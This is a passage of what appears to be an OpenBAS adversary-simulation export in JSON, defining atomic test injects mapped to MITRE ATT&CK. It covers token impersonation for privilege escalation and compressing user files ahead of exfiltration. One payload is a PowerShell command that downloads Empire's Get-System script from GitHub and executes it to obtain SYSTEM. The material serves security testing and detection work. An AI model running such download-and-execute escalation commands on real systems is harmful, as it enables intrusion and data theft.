          "label" : "Challenges interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "scoreboard_uri",
          "label" : "Scoreboard interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "lessons_uri",
          "label" : "Lessons learned interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        } ],
        "context" : { },
        "contract_id" : "57ac0391-f1d5-4dd0-a558-75f29dcd3838",
        "contract_attack_patterns_external_ids" : [ ],
        "is_atomic_testing" : true,
        "needs_executor" : true,
        "platforms" : [ "Windows" ]
      },
      "listened" : true,
      "injector_contract_id" : "57ac0391-f1d5-4dd0-a558-75f29dcd3838",
      "injector_contract_labels" : {
        "en" : "`SeDebugPrivilege` token duplication",
        "fr" : "`SeDebugPrivilege` token duplication"
      },
      "injector_contract_manual" : false,
      "injector_contract_content" : "{\"config\":{\"type\":\"openbas_implant\",\"expose\":true,\"label\":{\"en\":\"OpenBAS Implant\",\"fr\":\"OpenBAS Implant\"},\"color_dark\":\"#000000\",\"color_light\":\"#000000\"},\"label\":{\"en\":\"`SeDebugPrivilege` token duplication\",\"fr\":\"`SeDebugPrivilege` token duplication\"},\"manual\":false,\"fields\":[{\"key\":\"assets\",\"label\":\"Assets\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset\"},{\"key\":\"assetgroups\",\"label\":\"Asset groups\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset-group\"},{\"key\":\"obfuscator\",\"label\":\"Obfuscators\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"1\",\"defaultValue\":[\"plain-text\"],\"choices\":[{\"label\":\"plain-text\",\"value\":\"plain-text\",\"information\":\"\"},{\"label\":\"base64\",\"value\":\"base64\",\"information\":\"CMD does not support base64 obfuscation\"}],\"type\":\"choice\"},{\"key\":\"expectations\",\"label\":\"Expectations\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"predefinedExpectations\":[{\"expectation_type\":\"PREVENTION\",\"expectation_name\":\"Prevention\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"DETECTION\",\"expectation_name\":\"Detection\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"VULNERABILITY\",\"expectation_name\":\"Not vulnerable\",\"expectation_description\":\"\",\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600}],\"type\":\"expectation\"}],\"variables\":[{\"key\":\"user\",\"label\":\"User that will receive the injection\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[{\"key\":\"user.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.email\",\"label\":\"Email of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.firstname\",\"label\":\"First name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lastname\",\"label\":\"Last name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lang\",\"label\":\"Language of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"exercise\",\"label\":\"Exercise of the current injection\",\"type\":\"Object\",\"cardinality\":\"1\",\"children\":[{\"key\":\"exercise.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.name\",\"label\":\"Name of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.description\",\"label\":\"Description of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"teams\",\"label\":\"List of team name for the injection\",\"type\":\"String\",\"cardinality\":\"n\",\"children\":[]},{\"key\":\"player_uri\",\"label\":\"Player interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"challenges_uri\",\"label\":\"Challenges interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"scoreboard_uri\",\"label\":\"Scoreboard interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"lessons_uri\",\"label\":\"Lessons learned interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}],\"context\":{},\"contract_id\":\"57ac0391-f1d5-4dd0-a558-75f29dcd3838\",\"contract_attack_patterns_external_ids\":[],\"is_atomic_testing\":true,\"needs_executor\":true,\"platforms\":[\"Windows\"]}",
      "injector_contract_custom" : false,
      "injector_contract_needs_executor" : true,
      "injector_contract_platforms" : [ "Windows" ],
      "injector_contract_payload" : {
        "listened" : true,
        "payload_id" : "fb5ccf31-ddd2-4ebf-b478-bb8d85a8402d",
        "payload_type" : "Command",
        "payload_name" : "`SeDebugPrivilege` token duplication",
        "payload_description" : "Uses PowerShell and Empire's [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script uses `SeDebugPrivilege` to obtain, duplicate and impersonate the token of a another process.\nWhen executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).",
        "payload_platforms" : [ "Windows" ],
        "payload_attack_patterns" : [ {
          "attack_pattern_id" : "9332c8ee-5d6f-4f0c-ad62-2e2cc347c0db",
          "attack_pattern_name" : "Token Impersonation/Theft",
          "attack_pattern_description" : "Adversaries may duplicate then impersonate another user's existing token to escalate privileges and bypass access controls. For example, an adversary can duplicate an existing token using `DuplicateToken` or `DuplicateTokenEx`.(Citation: DuplicateToken function) The token can then be used with `ImpersonateLoggedOnUser` to allow the calling thread to impersonate a logged on user's security context, or with `SetThreadToken` to assign the impersonated token to a thread.\n\nAn adversary may perform [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) when they have a specific, existing process they want to assign the duplicated token to. For example, this may be useful for when the target user has a non-network logon session on the system.\n\nWhen an adversary would instead use a duplicated token to create a new process rather than attaching to an existing process, they can additionally [Create Process with Token](https://attack.mitre.org/techniques/T1134/002) using `CreateProcessWithTokenW` or `CreateProcessAsUserW`. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) is also distinct from [Make and Impersonate Token](https://attack.mitre.org/techniques/T1134/003) in that it refers to duplicating an existing token, rather than creating a new one.",
          "attack_pattern_external_id" : "T1134.001",
          "attack_pattern_kill_chain_phases" : [ {
            "phase_id" : "85f85b70-0513-4765-a231-c6de150aad97",
            "phase_external_id" : "TA0004",
            "phase_stix_id" : "x-mitre-tactic--5e29b093-294e-49e9-a803-dab3d73b77dd",
            "phase_name" : "Privilege Escalation",
            "phase_shortname" : "privilege-escalation",
            "phase_kill_chain_name" : "mitre-attack",
            "phase_description" : "The adversary is trying to gain higher-level permissions.\n\nPrivilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include: \n\n* SYSTEM/root level\n* local administrator\n* user account with admin-like access \n* user accounts with access to specific system or perform specific function\n\nThese techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.  ",
            "phase_order" : 5
          }, {
            "phase_id" : "92c4f727-b17e-4641-825d-ac5e3bc97527",
            "phase_external_id" : "TA0005",
            "phase_stix_id" : "x-mitre-tactic--78b23412-0651-46d7-a540-170a1ce8bd5a",
            "phase_name" : "Defense Evasion",
            "phase_shortname" : "defense-evasion",
            "phase_kill_chain_name" : "mitre-attack",
            "phase_description" : "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "phase_order" : 6
          } ]
        } ],
        "payload_cleanup_executor" : null,
        "payload_cleanup_command" : null,
        "payload_elevation_required" : true,
        "payload_arguments" : [ ],
        "payload_prerequisites" : [ ],
        "payload_external_id" : "34f0a430-9d04-4d98-bcb5-1989f14719f0",
        "payload_source" : "COMMUNITY",
        "payload_status" : "UNVERIFIED",
        "payload_execution_arch" : "ALL_ARCHITECTURES",
        "payload_collector" : "0f2a85c1-0a3b-4405-a79c-c65398ee4a76",
        "payload_detection_remediations" : [ ],
        "payload_tags" : [ ],
        "payload_output_parsers" : [ ],
        "payload_created_at" : "2024-12-12T08:11:37.699697Z",
        "payload_updated_at" : "2025-07-03T14:46:37.380975Z",
        "command_executor" : "psh",
        "command_content" : "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique Token -Verbose\n",
        "payload_collector_type" : "openbas_atomic_red_team"
      },
      "injector_contract_created_at" : "2024-12-12T08:11:37.715482Z",
      "injector_contract_updated_at" : "2024-12-12T08:11:37.715482Z",
      "injector_contract_injector" : "49229430-b5b5-431f-ba5b-f36f599b0144",
      "injector_contract_attack_patterns" : [ {
        "attack_pattern_id" : "9332c8ee-5d6f-4f0c-ad62-2e2cc347c0db",
        "attack_pattern_name" : "Token Impersonation/Theft",
        "attack_pattern_description" : "Adversaries may duplicate then impersonate another user's existing token to escalate privileges and bypass access controls. For example, an adversary can duplicate an existing token using `DuplicateToken` or `DuplicateTokenEx`.(Citation: DuplicateToken function) The token can then be used with `ImpersonateLoggedOnUser` to allow the calling thread to impersonate a logged on user's security context, or with `SetThreadToken` to assign the impersonated token to a thread.\n\nAn adversary may perform [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) when they have a specific, existing process they want to assign the duplicated token to. For example, this may be useful for when the target user has a non-network logon session on the system.\n\nWhen an adversary would instead use a duplicated token to create a new process rather than attaching to an existing process, they can additionally [Create Process with Token](https://attack.mitre.org/techniques/T1134/002) using `CreateProcessWithTokenW` or `CreateProcessAsUserW`. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) is also distinct from [Make and Impersonate Token](https://attack.mitre.org/techniques/T1134/003) in that it refers to duplicating an existing token, rather than creating a new one.",
        "attack_pattern_external_id" : "T1134.001",
        "attack_pattern_kill_chain_phases" : [ {
          "phase_id" : "85f85b70-0513-4765-a231-c6de150aad97",
          "phase_external_id" : "TA0004",
          "phase_stix_id" : "x-mitre-tactic--5e29b093-294e-49e9-a803-dab3d73b77dd",
          "phase_name" : "Privilege Escalation",
          "phase_shortname" : "privilege-escalation",
          "phase_kill_chain_name" : "mitre-attack",
          "phase_description" : "The adversary is trying to gain higher-level permissions.\n\nPrivilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include: \n\n* SYSTEM/root level\n* local administrator\n* user account with admin-like access \n* user accounts with access to specific system or perform specific function\n\nThese techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.  ",
          "phase_order" : 5
        }, {
          "phase_id" : "92c4f727-b17e-4641-825d-ac5e3bc97527",
          "phase_external_id" : "TA0005",
          "phase_stix_id" : "x-mitre-tactic--78b23412-0651-46d7-a540-170a1ce8bd5a",
          "phase_name" : "Defense Evasion",
          "phase_shortname" : "defense-evasion",
          "phase_kill_chain_name" : "mitre-attack",
          "phase_description" : "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
          "phase_order" : 6
        } ]
      } ],
      "injector_contract_atomic_testing" : true,
      "injector_contract_import_available" : false,
      "injector_contract_arch" : "ALL_ARCHITECTURES",
      "injector_contract_injector_type" : "openbas_implant",
      "injector_contract_injector_type_name" : "OpenBAS Implant"
    },
    "inject_tags" : [ ],
    "inject_teams" : [ ],
    "inject_documents" : [ ]
  }, {
    "inject_id" : "ceb104f8-dd9b-4da1-8439-a7f965765cbe",
    "inject_title" : "Compress Data for Exfiltration With Rar",
    "inject_description" : null,
    "inject_country" : null,
    "inject_city" : null,
    "inject_enabled" : true,
    "inject_content" : {
      "input_path" : "%USERPROFILE%",
      "file_extension" : ".txt",
      "output_file" : "%USERPROFILE%\\T1560.001-data.rar",
      "rar_installer" : "%TEMP%\\winrar.exe",
      "rar_exe" : "%programfiles%/WinRAR/Rar.exe",
      "expectations" : [ {
        "expectation_type" : "PREVENTION",
        "expectation_name" : "Expect inject to be prevented",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      }, {
        "expectation_type" : "DETECTION",
        "expectation_name" : "Expect inject to be detected",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      } ]
    },
    "inject_all_teams" : false,
    "inject_depends_on" : [ ],
    "inject_depends_duration" : 1560,
    "inject_injector_contract" : {
      "convertedContent" : {
        "config" : {
          "type" : "openbas_implant",
          "expose" : true,
          "label" : {
            "en" : "OpenBAS Implant",
            "fr" : "OpenBAS Implant"
          },
          "color_dark" : "#000000",
          "color_light" : "#000000"
        },
        "label" : {
          "en" : "Compress Data for Exfiltration With Rar",
          "fr" : "Compress Data for Exfiltration With Rar"
        },
        "manual" : false,
        "fields" : [ {
          "key" : "assets",
          "label" : "Assets",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset"
        }, {
          "key" : "assetgroups",
          "label" : "Asset groups",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset-group"
        }, {
          "key" : "obfuscator",
          "label" : "Obfuscators",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "1",
          "defaultValue" : [ "plain-text" ],
          "choices" : [ {
            "label" : "plain-text",
            "value" : "plain-text",
            "information" : ""
          }, {
            "label" : "base64",
            "value" : "base64",
            "information" : "CMD does not support base64 obfuscation"
          } ],
          "type" : "choice"
        }, {
          "key" : "expectations",
          "label" : "Expectations",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "predefinedExpectations" : [ {
            "expectation_type" : "PREVENTION",
            "expectation_name" : "Prevention",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "DETECTION",
            "expectation_name" : "Detection",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "VULNERABILITY",
            "expectation_name" : "Not vulnerable",
            "expectation_description" : "",
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          } ],
          "type" : "expectation"
        }, {
          "key" : "input_path",
          "label" : "input_path",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "%USERPROFILE%",
          "type" : "text"
        }, {
          "key" : "file_extension",
          "label" : "file_extension",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : ".txt",
          "type" : "text"
        }, {
          "key" : "output_file",
          "label" : "output_file",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "%USERPROFILE%\\T1560.001-data.rar",
          "type" : "text"
        }, {
          "key" : "rar_installer",
          "label" : "rar_installer",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "%TEMP%\\winrar.exe",
          "type" : "text"
        }, {
          "key" : "rar_exe",
          "label" : "rar_exe",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "%programfiles%/WinRAR/Rar.exe",
          "type" : "text"
        } ],
        "variables" : [ {
          "key" : "user",
          "label" : "User that will receive the injection",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ {
            "key" : "user.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.email",
            "label" : "Email of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.firstname",
            "label" : "First name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lastname",
            "label" : "Last name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lang",
            "label" : "Language of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "exercise",
          "label" : "Exercise of the current injection",
          "type" : "Object",
          "cardinality" : "1",
          "children" : [ {
            "key" : "exercise.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.name",
            "label" : "Name of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.description",
            "label" : "Description of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "teams",
          "label" : "List of team name for the injection",
          "type" : "String",
          "cardinality" : "n",
          "children" : [ ]
        }, {
          "key" : "player_uri",
          "label" : "Player interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "challenges_uri",
          "label" : "Challenges interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "scoreboard_uri",
          "label" : "Scoreboard interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "lessons_uri",
          "label" : "Lessons learned interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        } ],
        "context" : { },
        "contract_id" : "a36dd1c5-f400-49fc-81e9-e0b5bc0ee362",
        "contract_attack_patterns_external_ids" : [ ],
        "is_atomic_testing" : true,
        "needs_executor" : true,
        "platforms" : [ "Windows" ]
      },
      "listened" : true,
      "injector_contract_id" : "a36dd1c5-f400-49fc-81e9-e0b5bc0ee362",
      "injector_contract_labels" : {
        "en" : "Compress Data for Exfiltration With Rar",
        "fr" : "Compress Data for Exfiltration With Rar"
      },
      "injector_contract_manual" : false,
      "injector_contract_content" : "{\"config\":{\"type\":\"openbas_implant\",\"expose\":true,\"label\":{\"en\":\"OpenBAS Implant\",\"fr\":\"OpenBAS Implant\"},\"color_dark\":\"#000000\",\"color_light\":\"#000000\"},\"label\":{\"en\":\"Compress Data for Exfiltration With Rar\",\"fr\":\"Compress Data for Exfiltration With Rar\"},\"manual\":false,\"fields\":[{\"key\":\"assets\",\"label\":\"Assets\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset\"},{\"key\":\"assetgroups\",\"label\":\"Asset groups\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset-group\"},{\"key\":\"obfuscator\",\"label\":\"Obfuscators\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"1\",\"defaultValue\":[\"plain-text\"],\"choices\":[{\"label\":\"plain-text\",\"value\":\"plain-text\",\"information\":\"\"},{\"label\":\"base64\",\"value\":\"base64\",\"information\":\"CMD does not support base64 obfuscation\"}],\"type\":\"choice\"},{\"key\":\"expectations\",\"label\":\"Expectations\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"predefinedExpectations\":[{\"expectation_type\":\"PREVENTION\",\"expectation_name\":\"Prevention\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"DETECTION\",\"expectation_name\":\"Detection\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"VULNERABILITY\",\"expectation_name\":\"Not vulnerable\",\"expectation_description\":\"\",\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600}],\"type\":\"expectation\"},{\"key\":\"input_path\",\"label\":\"input_path\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"%USERPROFILE%\",\"type\":\"text\"},{\"key\":\"file_extension\",\"label\":\"file_extension\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\".txt\",\"type\":\"text\"},{\"key\":\"output_file\",\"label\":\"output_file\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"%USERPROFILE%\\\\T1560.001-data.rar\",\"type\":\"text\"},{\"key\":\"rar_installer\",\"label\":\"rar_installer\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"%TEMP%\\\\winrar.exe\",\"type\":\"text\"},{\"key\":\"rar_exe\",\"label\":\"rar_exe\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"%programfiles%/WinRAR/Rar.exe\",\"type\":\"text\"}],\"variables\":[{\"key\":\"user\",\"label\":\"User that will receive the injection\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[{\"key\":\"user.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.email\",\"label\":\"Email of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.firstname\",\"label\":\"First name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lastname\",\"label\":\"Last name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lang\",\"label\":\"Language of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"exercise\",\"label\":\"Exercise of the current injection\",\"type\":\"Object\",\"cardinality\":\"1\",\"children\":[{\"key\":\"exercise.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.name\",\"label\":\"Name of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.description\",\"label\":\"Description of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"teams\",\"label\":\"List of team name for the injection\",\"type\":\"String\",\"cardinality\":\"n\",\"children\":[]},{\"key\":\"player_uri\",\"label\":\"Player interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"challenges_uri\",\"label\":\"Challenges interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"scoreboard_uri\",\"label\":\"Scoreboard interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"lessons_uri\",\"label\":\"Lessons learned interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}],\"context\":{},\"contract_id\":\"a36dd1c5-f400-49fc-81e9-e0b5bc0ee362\",\"contract_attack_patterns_external_ids\":[],\"is_atomic_testing\":true,\"needs_executor\":true,\"platforms\":[\"Windows\"]}",
      "injector_contract_custom" : false,
      "injector_contract_needs_executor" : true,
      "injector_contract_platforms" : [ "Windows" ],
      "injector_contract_payload" : {
        "listened" : true,
        "payload_id" : "32d3b8a4-85a6-4b3e-b177-13eafca64cc4",
        "payload_type" : "Command",
        "payload_name" : "Compress Data for Exfiltration With Rar",
        "payload_description" : "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration.\nWhen the test completes you should find the txt files from the %USERPROFILE% directory compressed in a file called T1560.001-data.rar in the %USERPROFILE% directory \n",
        "payload_platforms" : [ "Windows" ],
        "payload_attack_patterns" : [ {
          "attack_pattern_id" : "ebbb4608-23d9-4fd7-b099-0983910d6dfd",
          "attack_pattern_name" : "Archive via Utility",
          "attack_pattern_description" : "Adversaries may use utilities to compress and/or encrypt collected data prior to exfiltration. Many utilities include functionalities to compress, encrypt, or otherwise package data into a format that is easier/more secure to transport.\n\nAdversaries may abuse various utilities to compress or encrypt data before exfiltration. Some third party utilities may be preinstalled, such as <code>tar</code> on Linux and macOS or <code>zip</code> on Windows systems. \n\nOn Windows, <code>diantz</code> or <code> makecab</code> may be used to package collected files into a cabinet (.cab) file. <code>diantz</code> may also be used to download and compress files from remote locations (i.e. [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002)).(Citation: diantz.exe_lolbas) <code>xcopy</code> on Windows can copy files and directories with a variety of options. Additionally, adversaries may use [certutil](https://attack.mitre.org/software/S0160) to Base64 encode collected data before exfiltration. \n\nAdversaries may use also third party utilities, such as 7-Zip, WinRAR, and WinZip, to perform similar activities.(Citation: 7zip Homepage)(Citation: WinRAR Homepage)(Citation: WinZip Homepage)",
          "attack_pattern_external_id" : "T1560.001",
          "attack_pattern_kill_chain_phases" : [ {
            "phase_id" : "304030e2-2bb4-4236-8e56-68d81468de1e",
            "phase_external_id" : "TA0009",
            "phase_stix_id" : "x-mitre-tactic--d108ce10-2419-4cf9-a774-46161d6c6cfe",
            "phase_name" : "Collection",
            "phase_shortname" : "collection",
            "phase_kill_chain_name" : "mitre-attack",
            "phase_description" : "The adversary is trying to gather data of interest to their goal.\n\nCollection consists of techniques adversaries may use to gather information and the sources information is collected from that are relevant to following through on the adversary's objectives. Frequently, the next goal after collecting data is to either steal (exfiltrate) the data or to use the data to gain more information about the target environment. Common target sources include various drive types, browsers, audio, video, and email. Common collection methods include capturing screenshots and keyboard input.",
            "phase_order" : 10
          } ]
        } ],
        "payload_cleanup_executor" : "cmd",
        "payload_cleanup_command" : "del /f /q /s #{output_file} >nul 2>&1\n",
        "payload_elevation_required" : false,
        "payload_arguments" : [ {
          "type" : "text",
          "key" : "input_path",
          "default_value" : "%USERPROFILE%",
          "description" : null,
          "separator" : null
        }, {
          "type" : "text",
          "key" : "file_extension",
          "default_value" : ".txt",
          "description" : null,
          "separator" : null
        }, {
          "type" : "text",
          "key" : "output_file",
          "default_value" : "%USERPROFILE%\\T1560.001-data.rar",
          "description" : null,
          "separator" : null
        }, {
          "type" : "text",
